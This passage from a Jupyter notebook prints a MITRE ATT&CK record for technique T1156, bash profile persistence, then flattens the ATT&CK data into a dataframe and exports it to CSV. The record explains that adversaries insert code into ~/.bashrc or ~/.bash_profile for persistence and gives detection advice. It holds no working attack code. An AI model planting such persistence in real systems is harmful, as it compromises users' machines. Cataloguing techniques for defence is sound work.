      "                          'a user logs in (via username and password) to the '\n",
      "                          'console (either locally or remotely via something '\n",
      "                          'like SSH), <code>~/.bash_profile</code> is executed '\n",
      "                          'before the initial command prompt is returned to '\n",
      "                          'the user. After that, every time a new shell is '\n",
      "                          'opened, <code>~/.bashrc</code> is executed. This '\n",
      "                          'allows users more fine grained control over when '\n",
      "                          'they want certain commands executed.\\n'\n",
      "                          '\\n'\n",
      "                          \"Mac's Terminal.app is a little different in that it \"\n",
      "                          'runs a login shell by default each time a new '\n",
      "                          'terminal window is opened, thus calling '\n",
      "                          '<code>~/.bash_profile</code> each time instead of '\n",
      "                          '<code>~/.bashrc</code>.\\n'\n",
      "                          '\\n'\n",
      "                          'These files are meant to be written to by the local '\n",
      "                          'user to configure their own environment; however, '\n",
      "                          'adversaries can also insert code into these files '\n",
      "                          'to gain persistence each time a user logs in or '\n",
      "                          'opens a new shell  (Citation: amnesia malware).\\n'\n",
      "                          '\\n'\n",
      "                          'Detection: While users may customize their '\n",
      "                          '<code>~/.bashrc</code> and '\n",
      "                          '<code>~/.bash_profile</code> files , there are only '\n",
      "                          'certain types of commands that typically appear in '\n",
      "                          'these files. Monitor for abnormal commands such as '\n",
      "                          'execution of unknown programs, opening network '\n",
      "                          'sockets, or reaching out across the network when '\n",
      "                          'user profiles are loaded during the login process.\\n'\n",
      "                          '\\n'\n",
      "                          'Platforms: Linux, macOS\\n'\n",
      "                          '\\n'\n",
      "                          'Data Sources: File monitoring, Process Monitoring, '\n",
      "                          'Process command-line parameters, Process use of '\n",
      "                          'network\\n'\n",
      "                          '\\n'\n",
      "                          'Permissions Required: User, Administrator',\n",
      " 'technique id': 'T1156',\n",
      " 'technique references': None,\n",
      " 'url': 'https://attack.mitre.org/wiki/Technique/T1156'}\n"
     ]
    }
   ],
   "source": [
    "pprint.pprint(all_attack_framework[0])"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Showing schema of the results"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 27,
   "metadata": {},
   "outputs": [],
   "source": [
    "df = json_normalize(all_attack_framework)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 28,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['contributors',\n",
       " 'data sources',\n",
       " 'defense bypassed',\n",
       " 'detectable',\n",
       " 'detectable description',\n",
       " 'difficulty',\n",
       " 'difficulty description',\n",
       " 'effective permissions',\n",
       " 'group',\n",
       " 'group aliases',\n",
       " 'group description',\n",
       " 'group id',\n",
       " 'group references',\n",
       " 'matrix',\n",
       " 'mitigation',\n",
       " 'mitigation description',\n",
       " 'mitigation id',\n",
       " 'mitigation references',\n",
       " 'network requirements',\n",
       " 'permission required',\n",
       " 'platforms',\n",
       " 'relationship description',\n",
       " 'remote support',\n",
       " 'software',\n",
       " 'software aliases',\n",
       " 'software description',\n",
       " 'software id',\n",
       " 'software labels',\n",
       " 'software references',\n",
       " 'software url',\n",
       " 'system requirements',\n",
       " 'tactic',\n",
       " 'tactic type',\n",
       " 'technique',\n",
       " 'technique description',\n",
       " 'technique id',\n",
       " 'technique references',\n",
       " 'url']"
      ]
     },
     "execution_count": 28,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "list(df)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### We can then export All ATT&CK as a CSV file"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 29,
   "metadata": {},
   "outputs": [],
   "source": [
    "df = df[[\n",
    "    'matrix','tactic','technique','technique id','technique description',\n",
    "    'mitigation','mitigation description','group','group id','group aliases',\n",
    "    'group description','software','software id','software description','software labels',\n",
    "    'relationship description','platforms','data sources','detectable','detectable description',\n",
    "    'difficulty','difficulty description','effective permissions','network requirements','permission required',\n",
    "    'remote support','system requirements','contributors','url']]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 30,
   "metadata": {},
   "outputs": [],
   "source": [
    "df.to_csv('all_attack.csv',index=False,encoding='utf-8')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.6.5"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
